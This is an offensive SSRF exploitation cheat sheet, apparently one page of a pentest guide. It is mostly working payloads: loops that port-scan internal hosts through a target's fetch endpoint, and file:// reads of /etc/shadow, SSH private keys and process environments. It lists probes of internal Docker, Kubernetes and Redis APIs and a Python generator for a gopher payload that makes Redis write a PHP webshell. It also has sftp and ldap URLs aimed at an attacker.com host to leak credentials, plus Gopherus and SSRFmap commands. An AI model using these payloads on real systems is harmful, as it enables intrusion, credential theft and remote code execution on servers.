# SSRF Exploitation

## Confirming SSRF

### With Response (Non-Blind)

Request internal resource and check response:

```http
GET /fetch?url=http://127.0.0.1:80 HTTP/1.1
Host: target.com
```

Look for:
- Different response size/content
- Error messages revealing internal info
- Actual internal content in response

### Blind SSRF

Use external server to detect:

```http
GET /fetch?url=http://YOUR-ID.burpcollaborator.net HTTP/1.1
Host: target.com
```

Note from Collaborator:
- Source IP (server's real IP)
- Request headers (User-Agent, custom headers)
- Timing differences

### Time-Based Detection

```bash
# Open port = fast response
?url=http://127.0.0.1:80  # ~100ms

# Closed port = timeout or error
?url=http://127.0.0.1:12345  # ~10s timeout
```

## Port Scanning

### Internal Port Scan

```bash
# Common ports
for port in 21 22 23 25 80 443 445 3306 5432 6379 8080 27017; do
  curl -s -o /dev/null -w "%{http_code} %{time_total}\n" \
    "https://target.com/fetch?url=http://127.0.0.1:$port"
done
```

### Network Discovery

```bash
# Scan internal range
for i in {1..255}; do
  curl -s "https://target.com/fetch?url=http://192.168.1.$i:80" &
done
```

## Protocol Handlers

### file://

Read local files:

```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///home/user/.ssh/id_rsa
file:///var/log/apache2/access.log
file:///c:/windows/win.ini
```

### dict://

DICT protocol for service interaction:

```
dict://127.0.0.1:11211/stats  # Memcached
dict://127.0.0.1:6379/info    # Redis
```

### gopher://

Most powerful - craft raw TCP requests:

```bash
# Redis command
gopher://127.0.0.1:6379/_INFO%0D%0AQUIT%0D%0A

# HTTP request via gopher
gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0A
```

### sftp://

```
sftp://attacker.com/  # May leak creds in logs
```

### ldap://

```
ldap://attacker.com:389/  # May leak info
```

## Reading Internal Services

### Checking Common Services

```bash
# Kubernetes
http://127.0.0.1:10255/pods
http://kubernetes.default.svc/

# Docker
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/images/json

# Consul
http://127.0.0.1:8500/v1/agent/members

# Elasticsearch
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_search?q=*

# Redis
# Use gopher or dict protocol

# Internal web apps
http://127.0.0.1:8080/admin
http://localhost/server-status
http://127.0.0.1/manager/html  # Tomcat
```

### Extracting Data

If you can see responses:

```bash
# Read internal API
?url=http://internal-api.local/users

# Access admin panels
?url=http://127.0.0.1:8080/admin/config

# Read environment
?url=file:///proc/self/environ
```

## Weaponizing Gopher

### Gopher URL Format

```
gopher://<host>:<port>/_<payload>
```

Payload needs URL encoding:
- `\r\n` → `%0D%0A`
- Spaces → `%20`

### Redis RCE via Gopher

```python
# Generate gopher payload for Redis
import urllib.parse

commands = """
SET shell "<?php system($_GET['cmd']); ?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SAVE
QUIT
"""

payload = ""
for line in commands.strip().split('\n'):
    payload += f"*{len(line.split())}\r\n"
    for arg in line.split():
        payload += f"${len(arg)}\r\n{arg}\r\n"

print("gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload))
```

### MySQL via Gopher

Requires MySQL without password:

```python
# Craft MySQL packet
# Complex - use gopherus tool
```

## Tools

### Gopherus

Generate gopher payloads automatically:

```bash
python gopherus.py --exploit mysql
python gopherus.py --exploit redis
python gopherus.py --exploit fastcgi
```

### SSRFmap

```bash
python ssrfmap.py -r request.txt -p url -m readfiles
python ssrfmap.py -r request.txt -p url -m portscan
```

---

Got SSRF working? Move to [Escalation](escalate.md) for cloud metadata and RCE chains.
